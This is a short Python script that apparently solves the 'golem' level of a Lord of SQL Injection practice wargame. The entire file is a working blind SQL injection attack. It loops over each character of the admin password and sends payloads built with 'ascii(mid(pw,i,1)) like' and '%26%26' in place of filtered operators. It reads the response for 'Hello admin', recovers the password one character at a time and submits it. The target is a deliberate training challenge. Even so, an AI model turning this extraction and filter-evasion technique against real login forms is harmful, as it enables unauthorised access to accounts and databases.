import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = {'PHPSESSID': session_id}


def get_pw():
    length = 8
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f"?id=admin&pw=' || ascii(mid(pw,{i},1)) like {j} %26%26 id like 'admin' || '"
            res = requests.get(url + payload, cookies=cookies)

            if "Hello admin" in res.text:
                pw += chr(j)
                print(chr(j), end=" ")
                break
    return pw


pw = get_pw()
print()
print("pw :", pw)
params = {
    'pw': pw
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
